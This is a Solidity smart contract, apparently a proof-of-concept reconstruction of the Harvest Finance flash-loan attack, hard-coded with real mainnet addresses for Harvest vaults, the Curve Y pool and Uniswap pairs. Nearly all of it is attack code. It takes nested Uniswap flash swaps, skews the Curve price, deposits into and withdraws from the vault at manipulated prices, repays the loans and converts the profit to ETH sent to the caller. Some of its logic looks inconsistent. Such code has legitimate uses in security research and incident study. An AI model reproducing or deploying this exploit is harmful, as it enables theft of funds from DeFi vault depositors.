
// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.13;
import "./interfaces/IFlashLoanReceiver.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/IUniswapV2Router02.sol";

interface HVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
    function balanceOf(address account) external view returns (uint256);
}
interface yCurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract HarvestExploitSuper {
    event Log(string message, uint256 val);

    address constant ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;    
    HVault constant FARM_USDT = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    HVault constant FARM_USDC = HVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
    yCurve constant Y_CURVE = yCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);

    IERC20 constant yUSDT = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    IERC20 constant yUSDC = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    IUniswapV2Pair constant uUSDT = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair constant uUSDC = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f); 
    
    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address private constant _USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant _USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant _WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Pair private usdcToWethPair;
    IUniswapV2Pair private usdtToWethPair;
    IUniswapV2Router02 public uniswapRouter;

    function uniswapSwapUSDCWETH(uint256 _amountIn) public payable {        
        USDC.approve(address(uniswapRouter), _amountIn);
        (uint256 reserveUSDC, uint256 reserveWETH, ) = usdcToWethPair.getReserves();
        uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, amountOut, path, address(this), block.timestamp);
    }
    function uniswapSwapUSDTWETH(uint256 _amountIn) public payable {
        USDT.approve(address(uniswapRouter), _amountIn);
        (uint256 reserveUSDT, uint256 reserveWETH, ) = usdtToWethPair.getReserves();
        uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDT, reserveWETH);
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, amountOut, path, address(this), block.timestamp);
    }
    constructor() {
        payable(address(0x0)).transfer(address(this).balance);        
        usdcToWethPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(_USDC), address(_WETH)));
        usdtToWethPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(_USDT), address(_WETH)));
        uniswapRouter = IUniswapV2Router02(UNISWAP_ROUTER);
        USDC.approve(address(uUSDC), ~uint256(0));
        USDC.approve(address(FARM_USDT), ~uint256(0));
        USDC.approve(address(FARM_USDC), ~uint256(0));
        USDC.approve(address(Y_CURVE), ~uint256(0));
        USDC.approve(address(this), ~uint256(0));

        USDT.approve(address(uUSDT), ~uint256(0));
        USDT.approve(address(FARM_USDT), ~uint256(0));
        USDT.approve(address(FARM_USDC), ~uint256(0));
        USDT.approve(address(Y_CURVE), ~uint256(0));
        USDT.approve(address(this), ~uint256(0));
    }

    function testExploit() public {        
        uint256 usdcFS = 100000000 * 10**6;
        uUSDT.swap(
            0,
            usdcFS,
            address(this),
            "0x"
        );
    
        uint256 _profitUSDC = USDC.balanceOf(address(this));
        uint256 _profitUSDT = USDT.balanceOf(address(this));
        uniswapSwapUSDCWETH(_profitUSDC);    
        uniswapSwapUSDTWETH(_profitUSDT);
        uint256 _profitWETH = WETH.balanceOf(address(this));
        IWETH(address(WETH)).withdraw(_profitWETH);
        payable(tx.origin).transfer(address(this).balance);

        // emit Log("WETH:CA", WETH.balanceOf(address(this)));
        // emit Log("WETH:EOA", WETH.balanceOf(address(tx.origin)));

        // emit Log("balance:CA", address(this).balance);
        // emit Log("balance:EOA", address(tx.origin).balance);
        
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if (msg.sender == address(uUSDC)) {
            {
                uint256 _usdt = USDT.balanceOf(address(this));
                uint256 _usdc = USDC.balanceOf(address(this));
                Y_CURVE.exchange_underlying(1, 2, _usdc, 0);
                FARM_USDT.deposit(_usdt - (100000 * 1e6));
                uint _vaultShare = FARM_USDT.balanceOf(address(this));
                uint256 __usdt = USDT.balanceOf(address(this));
                Y_CURVE.exchange_underlying(2, 1, __usdt, 0);
                FARM_USDT.withdraw(_vaultShare);
                USDC.transfer(address(uUSDC), _usdc * 1.00301 ether / 1 ether);
                USDT.transfer(address(uUSDT), _usdt * 1.00301 ether / 1 ether);
            }
        } else if (msg.sender == address(uUSDT)) {
            uUSDC.swap(
                10000000 * 1e6,
                0,
                address(this),
                "0x"
            );
        }
    }
    fallback () external payable {}
}
